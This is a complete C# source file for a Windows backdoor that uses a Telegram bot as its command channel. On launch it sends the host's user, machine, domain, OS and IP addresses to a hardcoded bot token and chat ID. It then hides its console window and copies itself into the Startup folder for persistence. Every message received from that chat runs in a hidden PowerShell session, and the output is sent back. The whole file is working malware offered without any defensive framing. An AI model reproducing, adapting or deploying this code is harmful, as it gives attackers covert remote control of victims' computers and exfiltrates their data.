// csc.exe /target:winexe /r:System.Net.Http.dll program.cs
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace CctorExample
{
    class Program
    {
        // ── P/Invoke to hide the console window ──────────────────────────────
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_HIDE = 0;

        // ── PowerShell session state ─────────────────────────────────────────
        private static Process _psProcess;
        private static StreamWriter _psInput;
        private static StringBuilder _psOutputBuffer = new StringBuilder();
        private static object _psLock = new object();
        private static AutoResetEvent _psDoneEvent = new AutoResetEvent(false);

        static Program()
        {
            // Force TLS 1.2 - .NET 4.x defaults to TLS 1.0 which Telegram rejects
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            try
            {
                string localIp = GetLocalIPv4();
                string publicIp = GetPublicIP().GetAwaiter().GetResult();

                string message =
                    "=== Host Information ===\n" +
                    "User: " + Environment.UserName + "\n" +
                    "Machine: " + Environment.MachineName + "\n" +
                    "Domain: " + Environment.UserDomainName + "\n" +
                    "OS: " + Environment.OSVersion + "\n" +
                    "64-bit OS: " + Environment.Is64BitOperatingSystem + "\n" +
                    "64-bit Process: " + Environment.Is64BitProcess + "\n" +
                    "Processor Count: " + Environment.ProcessorCount + "\n" +
                    "Local IP: " + localIp + "\n" +
                    "Public IP: " + publicIp;

                SendToTelegram(message).GetAwaiter().GetResult();
            }
            catch { }
        }

        static void Main(string[] args)
        {
            // Hide the console window immediately
            IntPtr hwnd = GetConsoleWindow();
            if (hwnd != IntPtr.Zero)
                ShowWindow(hwnd, SW_HIDE);

            // Copy self to Windows Startup folder for persistence
            CopyToStartup();

            // Start polling Telegram updates and executing commands
            PollTelegramUpdates().GetAwaiter().GetResult();
        }

        private static void CopyToStartup()
        {
            try
            {
                string startupFolder = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    @"Microsoft\Windows\Start Menu\Programs\Startup");

                string currentExe = System.Reflection.Assembly.GetExecutingAssembly().Location;
                string destFile = Path.Combine(startupFolder, Path.GetFileName(currentExe));

                // Only copy if not already running from the startup folder
                if (!string.Equals(currentExe, destFile, StringComparison.OrdinalIgnoreCase))
                {
                    File.Copy(currentExe, destFile, true);
                }
            }
            catch { }
        }

        private static async Task PollTelegramUpdates()
        {
            const string BotToken = "8856914598:AAFTFLreLP5FJhPPbD0QsG27NYBnBoqY7ko";
            const string ChatId = "467115391";
            long expectedChatId = long.Parse(ChatId);

            using (HttpClient client = new HttpClient())
            {
                client.Timeout = TimeSpan.FromSeconds(45);

                long offset = 0;

                // Initialize offset to skip any old pending messages on startup
                try
                {
                    string initUrl = "https://api.telegram.org/bot" + BotToken + "/getUpdates?limit=100&offset=-1";
                    string responseString = await client.GetStringAsync(initUrl);
                    List<SimpleTelegramUpdate> response = ParseTelegramUpdates(responseString);
                    if (response != null && response.Count > 0)
                    {
                        offset = response[0].UpdateId + 1;
                    }
                }
                catch { }

                while (true)
                {
                    string commandToRun = null;
                    bool shouldWait = false;

                    try
                    {
                        string url = "https://api.telegram.org/bot" + BotToken + "/getUpdates?offset=" + offset + "&timeout=30";
                        string responseString = await client.GetStringAsync(url);
                        List<SimpleTelegramUpdate> updates = ParseTelegramUpdates(responseString);

                        if (updates != null)
                        {
                            foreach (SimpleTelegramUpdate update in updates)
                            {
                                offset = update.UpdateId + 1;

                                if (update.Text != null)
                                {
                                    if (update.ChatId == expectedChatId || update.FromId == expectedChatId)
                                    {
                                        commandToRun = update.Text;
                                        break;
                                    }
                                }
                            }
                        }
                    }
                    catch
                    {
                        shouldWait = true;
                    }

                    if (commandToRun != null)
                    {
                        string result = await ExecutePowerShellCommand(commandToRun);
                        await SendToTelegram(result);
                    }

                    if (shouldWait)
                    {
                        await Task.Delay(5000);
                    }
                }
            }
        }

        private static void StartPowerShellSession()
        {
            lock (_psLock)
            {
                if (_psProcess != null && !_psProcess.HasExited)
                    return;

                try
                {
                    _psProcess = new Process();
                    _psProcess.StartInfo.FileName = "powershell.exe";
                    _psProcess.StartInfo.Arguments = "-NoLogo -NoProfile -NonInteractive -Command -";
                    _psProcess.StartInfo.UseShellExecute = false;
                    _psProcess.StartInfo.RedirectStandardInput = true;
                    _psProcess.StartInfo.RedirectStandardOutput = true;
                    _psProcess.StartInfo.RedirectStandardError = true;
                    _psProcess.StartInfo.CreateNoWindow = true;

                    _psProcess.OutputDataReceived += (sender, e) =>
                    {
                        if (e.Data != null)
                        {
                            lock (_psLock)
                            {
                                if (e.Data.Trim() == "__PS_CMD_COMPLETED_8856914598__")
                                    _psDoneEvent.Set();
                                else
                                    _psOutputBuffer.AppendLine(e.Data);
                            }
                        }
                    };

                    _psProcess.ErrorDataReceived += (sender, e) =>
                    {
                        if (e.Data != null)
                        {
                            lock (_psLock)
                            {
                                _psOutputBuffer.AppendLine("Error: " + e.Data);
                            }
                        }
                    };

                    _psProcess.Start();
                    _psInput = _psProcess.StandardInput;
                    _psProcess.BeginOutputReadLine();
                    _psProcess.BeginErrorReadLine();
                }
                catch { }
            }
        }

        private static async Task<string> ExecutePowerShellCommand(string command)
        {
            StartPowerShellSession();

            if (_psProcess == null || _psProcess.HasExited)
                return "Error: Failed to start or maintain PowerShell session.";

            lock (_psLock)
            {
                _psOutputBuffer.Clear();
            }
            _psDoneEvent.Reset();

            try
            {
                _psInput.WriteLine(command);
                _psInput.WriteLine("Write-Output \"__PS_CMD_COMPLETED_8856914598__\"");
            }
            catch (Exception ex)
            {
                return "Error sending command: " + ex.Message;
            }

            bool finished = _psDoneEvent.WaitOne(60000);

            await Task.Delay(150);

            string result;
            lock (_psLock)
            {
                result = _psOutputBuffer.ToString();
            }

            if (!finished)
            {
                result += "\n[Warning: Command timed out after 60 seconds.]";
                try { _psProcess.Kill(); } catch { }
            }

            return result;
        }

        private static string GetLocalIPv4()
        {
            foreach (IPAddress ip in Dns.GetHostAddresses(Dns.GetHostName()))
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                    return ip.ToString();
            }
            return "Not Found";
        }

        private static async Task<string> GetPublicIP()
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    return await client.GetStringAsync("https://api.ipify.org");
                }
            }
            catch
            {
                return "Unknown";
            }
        }

        private static async Task SendToTelegram(string message)
        {
            const string BotToken = "8856914598:AAFTFLreLP5FJhPPbD0QsG27NYBnBoqY7ko";
            const string ChatId = "467115391";

            if (string.IsNullOrEmpty(message) || message.Trim().Length == 0)
                message = "[No Output]";

            if (message.Length > 20000)
                message = message.Substring(0, 20000) + "\n\n[Output truncated: too long...]";

            string url = "https://api.telegram.org/bot" + BotToken + "/sendMessage";
            using (HttpClient client = new HttpClient())
            {
                int maxChunkSize = 4000;
                for (int i = 0; i < message.Length; i += maxChunkSize)
                {
                    string chunk = message.Substring(i, Math.Min(maxChunkSize, message.Length - i));
                    string json = "{\"chat_id\":\"" + ChatId + "\",\"text\":\"" + EscapeJsonString(chunk) + "\"}";
                    var content = new StringContent(json, Encoding.UTF8, "application/json");
                    try
                    {
                        await client.PostAsync(url, content);
                    }
                    catch { }
                }
            }
        }

        private static string EscapeJsonString(string value)
        {
            if (string.IsNullOrEmpty(value))
                return "";

            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < value.Length; i++)
            {
                char c = value[i];
                switch (c)
                {
                    case '\"': sb.Append("\\\""); break;
                    case '\\': sb.Append("\\\\"); break;
                    case '\n': sb.Append("\\n"); break;
                    case '\r': sb.Append("\\r"); break;
                    case '\t': sb.Append("\\t"); break;
                    case '\b': sb.Append("\\b"); break;
                    case '\f': sb.Append("\\f"); break;
                    default:
                        if (c < ' ')
                            sb.Append(string.Format("\\u{0:x4}", (int)c));
                        else
                            sb.Append(c);
                        break;
                }
            }
            return sb.ToString();
        }

        private static List<SimpleTelegramUpdate> ParseTelegramUpdates(string json)
        {
            List<SimpleTelegramUpdate> list = new List<SimpleTelegramUpdate>();
            if (string.IsNullOrEmpty(json))
                return list;

            string[] delimiters = new string[] { "\"update_id\":" };
            string[] chunks = json.Split(delimiters, StringSplitOptions.None);

            for (int i = 1; i < chunks.Length; i++)
            {
                string chunk = chunks[i];
                string[] parts = chunk.Split(',');
                if (parts.Length == 0)
                    continue;

                long updateId;
                if (!long.TryParse(parts[0].Trim(), out updateId))
                    continue;

                long fromId = 0;
                Match fromMatch = Regex.Match(chunk, @"""from""\s*:\s*\{\s*""id""\s*:\s*(-?\d+)");
                if (fromMatch.Success)
                    long.TryParse(fromMatch.Groups[1].Value, out fromId);

                long chatId = 0;
                Match chatMatch = Regex.Match(chunk, @"""chat""\s*:\s*\{\s*""id""\s*:\s*(-?\d+)");
                if (chatMatch.Success)
                    long.TryParse(chatMatch.Groups[1].Value, out chatId);

                string text = null;
                Match textMatch = Regex.Match(chunk, @"""text""\s*:\s*""([^""\\]*(?:\\.[^""\\]*)*)""");
                if (textMatch.Success)
                    text = UnescapeJsonString(textMatch.Groups[1].Value);

                SimpleTelegramUpdate update = new SimpleTelegramUpdate();
                update.UpdateId = updateId;
                update.ChatId = chatId;
                update.FromId = fromId;
                update.Text = text;
                list.Add(update);
            }

            return list;
        }

        private static string UnescapeJsonString(string value)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < value.Length; i++)
            {
                char c = value[i];
                if (c == '\\' && i + 1 < value.Length)
                {
                    i++;
                    char next = value[i];
                    switch (next)
                    {
                        case 'n': sb.Append('\n'); break;
                        case 'r': sb.Append('\r'); break;
                        case 't': sb.Append('\t'); break;
                        case 'b': sb.Append('\b'); break;
                        case 'f': sb.Append('\f'); break;
                        case 'u':
                            if (i + 4 < value.Length)
                            {
                                string hex = value.Substring(i + 1, 4);
                                sb.Append((char)Convert.ToInt32(hex, 16));
                                i += 4;
                            }
                            break;
                        default:
                            sb.Append(next);
                            break;
                    }
                }
                else
                {
                    sb.Append(c);
                }
            }
            return sb.ToString();
        }
    }

    public class SimpleTelegramUpdate
    {
        public long UpdateId;
        public long ChatId;
        public long FromId;
        public string Text;
    }
}
